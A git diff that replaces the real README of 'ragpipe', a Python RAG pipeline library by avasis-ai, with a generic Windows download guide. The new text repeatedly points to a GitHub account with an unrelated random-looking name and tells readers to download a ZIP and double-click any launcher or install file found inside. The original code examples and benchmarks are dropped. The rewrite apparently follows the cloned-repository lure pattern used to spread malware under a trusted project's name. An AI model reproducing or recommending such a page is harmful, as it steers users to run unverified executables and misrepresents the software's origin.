@@ -1,415 +1,278 @@
-<div align="center">
+# 🤖 ragpipe - Build RAG Pipelines With Less Work
 
-<img src="https://raw.githubusercontent.com/avasis-ai/ragpipe/main/.github/banner.svg" alt="RAGPipe" width="400">
+[![Download ragpipe](https://img.shields.io/badge/Download%20ragpipe-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Genusophiophagussqueezeplay359/ragpipe)
 
-**RAG in 3 functions.**
+## 🖥️ What ragpipe does
 
-[![GitHub stars](https://img.shields.io/github/stars/avasis-ai/ragpipe?style=social)](https://github.com/avasis-ai/ragpipe)
-[![PyPI version](https://img.shields.io/pypi/v/ragpipe-ai?color=blue)](https://pypi.org/project/ragpipe-ai/)
-[![PyPI downloads](https://img.shields.io/pypi/dm/ragpipe-ai?color=blue)](https://pypi.org/project/ragpipe-ai/)
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/License-BSL_1.1-green.svg)](LICENSE)
+ragpipe is a Python tool for building retrieval-augmented generation, or RAG, pipelines. It helps you take files, Git repos, and web pages, turn them into vector data, and use that data in search and chat flows.
 
-*Sources → Transforms → Sinks for vector databases.*
+It gives you three main functions:
 
-Zero config. Works with Ollama, OpenAI, Qdrant, Pinecone, or just a JSON file.
+- `ingest()` to load content
+- `query()` to search content
+- `pipe()` to connect the full flow
 
-</div>
+It also includes a CLI and YAML config files, so you can run it from the command line or set it up in a simple config file.
 
----
+## 📥 Download and open on Windows
 
-## What is RAG?
+Use this link to visit the download page:
 
-**RAG (Retrieval-Augmented Generation)** is how you give an AI access to your own data. Instead of guessing answers, the AI first searches your documents, finds the relevant parts, and then generates an answer based on what it found.
+[Visit the ragpipe download page](https://github.com/Genusophiophagussqueezeplay359/ragpipe)
 
-The problem? Getting your data into a searchable format is painful. You need to:
+### Steps for Windows
 
-1. **Extract** text from files, websites, code repos
-2. **Chunk** it into smaller pieces (AI can't read a 100-page PDF at once)
-3. **Embed** each chunk into numbers (so similar text gets similar numbers)
-4. **Store** those embeddings in a vector database
-5. **Search** when someone asks a question
+1. Open the link above.
+2. Click the green **Code** button on the GitHub page.
+3. Choose **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. If the project includes a Windows launcher or install file, double-click it.
+8. If you plan to use it from Python, keep the folder in a place you can find again.
 
-RAGPipe does all 5 steps in one pipeline. You tell it where your data is and where it should go. That's it.
+### If you want to run it with Python
 
-## Architecture
+1. Install Python 3.10 or newer.
+2. Open the folder in File Explorer.
+3. Hold **Shift** and right-click in the folder.
+4. Choose **Open PowerShell window here**.
+5. Run the install step shown in the project files.
+6. Start the app or run the CLI command from the same folder.
 
-<img src="https://raw.githubusercontent.com/avasis-ai/ragpipe/main/.github/architecture.svg" alt="RAGPipe Architecture" width="600">
+## ⚙️ What you need
 
-**How it works:** Your data flows through three stages — Sources pull data in, Transforms process it (clean, chunk, embed), and Sinks store the results in a vector database. When you query, RAGPipe searches the stored embeddings and returns the most relevant chunks.
+ragpipe is made for Windows users who want to set up a RAG pipeline without building every part by hand.
 
----
+You will usually need:
 
-## Install
+- Windows 10 or Windows 11
+- Python 3.10+
+- A modern web browser
+- Internet access for online models or web content
+- Enough free disk space for your files and indexes
 
-```bash
-pip install ragpipe-ai
-```
+If you use local models, you may also want:
 
-<details>
-<summary>With extras</summary>
+- Ollama installed on your machine
+- More RAM for model use
+- A GPU if your model needs it
 
-```bash
-pip install 'ragpipe-ai[cli,web]'    # CLI + web scraping
-pip install 'ragpipe-ai[qdrant]'      # Qdrant vector DB
-pip install 'ragpipe-ai[all]'         # everything
-```
+## 🚀 Quick start
 
-</details>
+Use ragpipe when you want to do one of these tasks:
 
-## The 3 API calls
+- Index PDFs, text files, or documents
+- Pull data from a Git repository
+- Read web pages and convert them into searchable chunks
+- Store embeddings in a vector database
+- Ask questions about your own content
 
-```python
-import ragpipe
+A basic flow looks like this:
 
-# 1. Ingest anything — files, git repos, web pages
-ragpipe.ingest("./docs", sink="json", sink_path="./my_data.json")
+1. Put your source files in a folder.
+2. Run `ingest()` to process the files.
+3. Save the embeddings in a vector database such as Qdrant or Pinecone.
+4. Run `query()` to ask a question.
+5. Use `pipe()` if you want one flow that connects ingest and query steps.
 
-# 2. Query your data
-results = ragpipe.query("What is the refund policy?", sink_path="./my_data.json")
-print(results[0].content)
+## 📁 What you can ingest
 
-# 3. Pipe — full control with the Pipeline API
-pipeline = ragpipe.Pipeline()
-pipeline.add_source(ragpipe.GitSource("https://github.com/owner/repo"))
-pipeline.add_transform(ragpipe.RecursiveChunker(chunk_size=512))
-pipeline.add_transform(ragpipe.AutoEmbed())
-pipeline.add_sink(ragpipe.QdrantSink("my-repo"))
-pipeline.run()
-```
+ragpipe is built to handle common content sources:
 
-**That's it.** No boilerplate, no frameworks, no config files (unless you want them).
+- Local files
+- Git repositories
+- Web pages
+- Text-based notes
+- Docs and knowledge files
 
-<img src="https://raw.githubusercontent.com/avasis-ai/ragpipe/main/.github/demo.gif" alt="RAGPipe Interactive Demo" width="480">
+It fits well if you want to build a personal search setup, a support bot, or a knowledge assistant that uses your own data.
 
-<a href="https://avasis-ai.github.io/ragpipe/demo.html"><img src="https://img.shields.io/badge/try_demo-interactive-orange?style=for-the-badge" alt="Try Demo"></a>
+## 🧠 Supported model and database options
 
----
+ragpipe is built to work with common RAG tools and services.
 
-## CLI
+### Vector databases
 
-```bash
-# Create a starter pipeline config
-ragpipe init
+- Qdrant
+- Pinecone
 
-# Ingest a directory
-ragpipe ingest ./docs
+### Model providers
 
-# Ingest a GitHub repo
-ragpipe ingest https://github.com/owner/repo --embed
+- Ollama
+- OpenAI
 
-# Scrape a website
-ragpipe ingest https://docs.example.com
+This gives you a choice between local and hosted setups. If you want to keep data on your own machine, Ollama is a practical fit. If you want hosted models, OpenAI works too.
 
-# Query your data
-ragpipe query "How does auth work?"
+## 🛠️ Basic setup
 
-# Run a YAML pipeline
-ragpipe run pipeline.yaml
-```
+### 1. Get the files
 
-### Smart-index any codebase
+Download the project from GitHub and extract it on Windows.
 
-```bash
-# Auto-detect language, ignore node_modules/.git/etc, chunk and store
-ragpipe index .
+### 2. Install Python packages
 
-# Watch for changes and auto-reindex
-ragpipe watch . --chunk-size 256
+Open PowerShell in the project folder and install the package dependencies listed in the project files.
 
-# Start a local API server (for VSCode, curl, any tool)
-ragpipe serve --port 7642
-```
+### 3. Set up your config
 
-### Search with fzf
+ragpipe uses YAML config files, so you can set paths, model names, and database settings in one place.
 
-```bash
-ragpipe search --fzf
-```
+A config file often includes:
 
-### Git hooks — auto-index on every commit
+- Source path
+- Chunk size
+- Embedding model
+- Vector database settings
+- Query options
 
-```bash
-ragpipe git hook .              # install
-ragpipe git remove .            # remove
-ragpipe git list .              # list installed
-```
+### 4. Run ingest
 
-### VSCode integration
+Use the ingest command or function to process your content and store vectors.
 
-```bash
-ragpipe vscode tasks .          # generates .vscode/tasks.json
-ragpipe vscode settings         # generates .vscode/settings.json
-```
+### 5. Run query
 
-### macOS — Spotlight integration
+Ask a question against the stored data and get the most relevant matches.
 
-```bash
-ragpipe macos spotlight "python files" --path ~/code
-ragpipe macos index ~/projects/my-app
-```
+## 🧩 Example use cases
 
-### Linux — systemd services
+### Personal knowledge base
 
-```bash
-ragpipe linux service --install     # install as systemd service
-ragpipe linux timer . -i daily        # auto-index on schedule
-```
+Store documents, notes, and web pages in one place. Then search them with plain-language questions.
 
-### With embeddings (auto-detects Ollama → OpenAI → sentence-transformers)
+### Git repo search
 
-```bash
-ragpipe ingest ./docs --embed --sink qdrant --collection my-kb
-ragpipe query "What features are in v2?" --sink qdrant
-```
+Point ragpipe at a repo and make it easy to search code, docs, and README files.
 
----
+### Support assistant
 
-## YAML Pipelines
+Load product docs and help articles into a vector database, then use them to answer user questions.
 
-Drop a `pipeline.yaml` in your project and run it with one command:
+### Research helper
 
-```yaml
-source:
-  type: git
-  repo_url: https://github.com/owner/repo
-  file_patterns:
-    - "src/**/*.py"
-    - "docs/**/*.md"
+Ingest articles and pages, then query them by topic, phrase, or concept.
 
-transforms:
-  - type: html_cleaner
-  - type: recursive_chunker
-    chunk_size: 512
-    chunk_overlap: 64
-  - type: auto_embed
+## 🧪 CLI workflow
 
-sinks:
-  - type: qdrant
-    collection_name: my-repo
-    url: http://localhost:6333
-    vector_size: 384
-```
+ragpipe includes a command-line interface for users who want a simple terminal flow.
 
-```bash
-ragpipe run pipeline.yaml
-```
+A typical pattern looks like this:
 
----
+1. Ingest your data
+2. Check that the vectors were stored
+3. Run a query
+4. Tune the YAML config if needed
 
-## Embedding Backends
+CLI use is useful if you want repeatable runs and fewer manual steps.
 
-`AutoEmbed` tries each backend in order and uses the first available:
+## 📝 YAML config workflow
 
-| Priority | Backend | Dimensions | Setup |
-|---|---|---|---|
-| 1 | **Ollama** (local) | 768 | `ollama pull nomic-embed-text` |
-| 2 | **OpenAI** | 1536 | Set `OPENAI_API_KEY` |
-| 3 | **sentence-transformers** (local) | 384 | `pip install 'ragpipe-ai[local]'` |
+YAML files keep setup in one place. This is useful when you want to reuse the same pipeline many times.
 
-Or point to any OpenAI-compatible API:
+You can store:
 
-```python
-ragpipe.ingest("./docs", embed=True, embed_base_url="http://localhost:11434/v1", embed_model="nomic-embed-text")
-```
+- File paths
+- Source URLs
+- Chunk settings
+- Embedding model names
+- Database credentials
+- Query limits
 
----
+This helps when you want a setup that is easy to edit without changing code.
 
-## Sources
+## 🔌 Common setup pattern
 
-| Source | Example | Description |
-|--------|---------|-------------|
-| `FileSource` | `FileSource("./docs")` | Local files and directories |
-| `GitSource` | `GitSource("https://github.com/owner/repo")` | Clone git repos |
-| `WebSource` | `WebSource("https://example.com")` | Scrape web pages |
+A simple ragpipe setup often follows this order:
 
-## Transforms
+1. Choose your source
+2. Choose your embedding model
+3. Choose your vector database
+4. Run ingest
+5. Run query
+6. Use pipe for a full workflow
 
-| Transform | Description |
-|-----------|-------------|
-| `RecursiveChunker(chunk_size=512, chunk_overlap=64)` | Split text using hierarchical separators |
-| `FixedSizeChunker(chunk_size=512)` | Split by fixed size |
-| `SemanticChunker(embedding_model=...)` | Split by semantic similarity |
-| `HTMLCleaner()` | Strip HTML to clean text |
-| `PIIRemover()` | Redact emails, phones, SSN, etc. |
-| `AutoEmbed()` | Zero-config embeddings (Ollama → OpenAI → ST) |
-| `EmbeddingTransform(model=..., api_key=...)` | Explicit OpenAI-compatible embeddings |
+If you use a local setup, Ollama pairs well with Qdrant. If you use a hosted setup, OpenAI and Pinecone are common choices.
 
-## Sinks
+## 📌 Repo details
 
-| Sink | Example |
-|------|---------|
-| `JSONSink(path="./out.json")` | Write to JSON file |
-| `QdrantSink("collection", url="...", vector_size=384)` | Write to Qdrant |
-| `PineconeSink("index", api_key="...", dimension=384)` | Write to Pinecone |
+- Name: ragpipe
+- Type: RAG pipeline library for Python
+- Main use: ingest, search, and pipe content into vector databases
+- Best for: local knowledge systems, document search, and AI workflows
 
----
-
-## Advanced Pipeline
-
-```python
-import ragpipe
-
-pipeline = (
-    ragpipe.Pipeline()
-    .add_source(ragpipe.WebSource(
-        urls=["https://docs.example.com"],
-        max_depth=1,
-        allowed_domains=["example.com"],
-    ))
-    .add_transform(ragpipe.HTMLCleaner())
-    .add_transform(ragpipe.PIIRemover())
-    .add_transform(ragpipe.RecursiveChunker(chunk_size=1024, chunk_overlap=128))
-    .add_transform(ragpipe.AutoEmbed())
-    .add_sink(ragpipe.QdrantSink(
-        collection_name="example-docs",
-        url="http://localhost:6333",
-        vector_size=384,
-    ))
-)
-
-stats = pipeline.run()
-# {'extracted': 47, 'transformed': 312, 'written': 312}
-```
-
-### Dry run (preview without writing)
-
-```python
-docs = pipeline.dry_run()
-for doc in docs:
-    print(f"[{doc.metadata.get('path', '?')}] {doc.char_count} chars")
-```
-
----
-
-## Benchmarks
-
-<img src="https://raw.githubusercontent.com/avasis-ai/ragpipe/main/.github/benchmark.svg" alt="RAGPipe vs LangChain vs LlamaIndex Benchmark" width="600">
-
-Indexed the **LangChain** repo (2,267 Python files, 7,388 chunks) on a 64-core Xeon:
-
-| Metric | Result |
-|--------|--------|
-| File discovery | **0.32s** |
-| Chunking | **0.09s** |
-| JSON persistence (14.8 MB) | **0.29s** |
-| **Total index time** | **0.71s** |
-| **Throughput** | **10,468 chunks/s** |
-| Query (keyword, top-5) | **0.20s** |
-
-One-liner equivalent:
-```bash
-ragpipe ingest ./langchain --chunk-size 1000
-ragpipe query "How does the chain interface work?"
-```
-
----
-
-## Comparison
-
-How does RAGPipe compare to the existing tools?
-
-### Quickstart — side by side
-
-**LangChain** (~40 lines, 5 packages):
-```python
-from langchain_community.document_loaders import WebBaseLoader
-from langchain_text_splitters import RecursiveCharacterTextSplitter
-from langchain_openai import OpenAIEmbeddings
-from langchain_core.vectorstores import InMemoryVectorStore
-
-loader = WebBaseLoader(web_paths=("https://example.com",))
-docs = loader.load()
-splits = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=200).split_documents(docs)
-vector_store = InMemoryVectorStore(OpenAIEmbeddings())
-vector_store.add_documents(documents=splits)
-# ... then wire up a retriever + LLM chain
-```
-
-**LlamaIndex** (~5 lines, 2 packages):
-```python
-from llama_index.core import VectorStoreIndex, SimpleDirectoryReader
-
-docs = SimpleDirectoryReader("data").load_data()
-index = VectorStoreIndex.from_documents(docs)
-response = index.as_query_engine().query("What is task decomposition?")
-```
-
-**RAGPipe** (3 lines, 1 package, zero config):
-```bash
-pip install ragpipe-ai
-ragpipe index ./docs
-ragpipe query "What is task decomposition?"
-```
-
-Or in Python:
-```python
-import ragpipe
-ragpipe.ingest("./docs")
-results = ragpipe.query("What is task decomposition?")
-```
-
-### Feature comparison
-
-| | **RAGPipe** | **LangChain** | **LlamaIndex** | **Chroma** | **Unstructured** |
-|---|:---:|:---:|:---:|:---:|:---:|
-| Basic RAG in 3 lines | **CLI + Python** | 40 LOC | 5 LOC | N/A | N/A |
-| Packages to install | **1** | 5+ | 2-3 | 1 | 1-2 |
-| CLI | **Built-in** | Separate | Separate | Built-in | No |
-| YAML config pipelines | **Built-in** | No | No | No | No |
-| Smart project indexing | **Built-in** | No | No | No | No |
-| Git hooks | **Built-in** | No | No | No | No |
-| VSCode tasks | **Built-in** | No | No | No | No |
-| fzf integration | **Built-in** | No | No | No | No |
-| systemd service | **Built-in** | No | No | No | No |
-| REST API server | **Built-in** | Separate | No | Built-in | No |
-| Document loaders | Common formats | 160+ | 300+ | N/A | 15+, best PDF |
-| Vector stores | 3 (configurable) | 40+ | 40+ | IS the store | N/A |
-| Agent framework | No | LangGraph | Agents | No | No |
-| Local-first (no API key) | **Yes** | No | Partial | Yes | No |
-
-### Where we're different
-
-RAGPipe isn't trying to be LangChain. It's **ops-native RAG infrastructure** — the `docker-compose` of RAG pipelines.
-
-- **LangChain/LlamaIndex** are frameworks with 100+ integrations. They're great if you need an obscure vector store or multi-agent orchestration. They require 5+ packages and 40+ lines for basic RAG.
-- **Chroma** is a vector database. It stores embeddings. That's it.
-- **Unstructured** is a document preprocessor. It parses PDFs. That's it.
-- **RAGPipe** is the glue. You point it at data, it handles the rest — with a CLI, git hooks, systemd, VSCode, and fzf baked in.
-
-### Where competitors win
-
-- **Ecosystem breadth** — LangChain and LlamaIndex have 100+ integrations each. We have 3 vector stores and 3 sources. (We're opinionated, not exhaustive.)
-- **Document parsing** — Unstructured is best-in-class for PDF/OCR. We read text files.
-- **Agent orchestration** — LangGraph handles stateful multi-step agents. We don't do agents.
-
----
-
-## Why RAGPipe?
-
-- **3 API calls.** `ingest()`, `query()`, `Pipeline()`. That's the whole surface area.
-- **Zero config.** Auto-detects files, auto-embeds with whatever you have installed.
-- **YAML pipelines.** Declarative configs like `docker-compose` for RAG.
-- **Beautiful CLI.** Rich progress bars, tables, and status spinners.
-- **Any source.** Files, git repos, web pages — one interface.
-- **Any vector DB.** Qdrant, Pinecone, or just a JSON file.
-- **Local-first.** Works with Ollama and sentence-transformers. No API keys needed.
-- **Smart indexing.** `ragpipe index .` auto-detects your language and ignores the right files.
-- **System integration.** Git hooks, VSCode tasks, macOS Spotlight, Linux systemd.
-- **REST API.** `ragpipe serve` exposes `/search`, `/health`, `/chunks` for any tool.
-- **fzf.** `ragpipe search --fzf` for interactive terminal search.
-- **Typed.** Full type annotations, mypy-friendly.
-
----
-
-## License
-
-Business Source License 1.1 (BSL 1.1). **Non-competing use is Apache 2.0.** See [LICENSE](./LICENSE).
-
----
-
-<div align="center">
-
-Built by [avasis-ai](https://github.com/avasis-ai)
-
-</div>
+## 🔍 Topics
+
+- ai-agent
+- autonomous-agent
+- avasis
+- data-ingestion
+- embeddings
+- llm
+- open-source
+- pinecone
+- pipeline
+- qdrant
+- rag
+- vector-database
+
+## 🧭 Good first path for new users
+
+If you are new to this kind of tool, use this order:
+
+1. Download the ZIP from GitHub.
+2. Extract it on Windows.
+3. Open the folder.
+4. Read the config files.
+5. Pick one source folder with a few documents.
+6. Run ingest.
+7. Run a simple query.
+8. Add more content after you confirm it works.
+
+This keeps the first run small and easier to manage.
+
+## 🧰 Troubleshooting
+
+### The ZIP file does not open
+
+Try downloading it again. If Windows still blocks it, save it to a local folder like Downloads or Desktop and extract it there.
+
+### PowerShell will not run the command
+
+Make sure you opened PowerShell in the project folder. If needed, reopen the folder and try again.
+
+### Your query returns no results
+
+Check that ingest finished and that your source files were added to the index. Also check the database settings in the YAML file.
+
+### The app cannot reach a model or database
+
+Check your internet connection, API key, and service settings. If you use local tools, make sure the local service is running.
+
+## 📎 Useful link
+
+[Open the ragpipe GitHub page](https://github.com/Genusophiophagussqueezeplay359/ragpipe)
+
+## 📦 Files you may see after download
+
+A typical Python project like this may include:
+
+- README files
+- YAML config files
+- Python source files
+- Example folders
+- CLI entry points
+- Dependency files
+
+If you see example configs, start there. They show the expected format and help you avoid setup mistakes.
+
+## 🧠 Why people use ragpipe
+
+ragpipe helps you turn raw content into something you can search and use in an AI flow. It cuts down on manual setup and gives you a clear path from source files to answers.
+
+It is a practical fit when you want:
+
+- simple ingest steps
+- searchable content
+- control over your data source
+- local or hosted model support
+- a Python-based RAG workflow
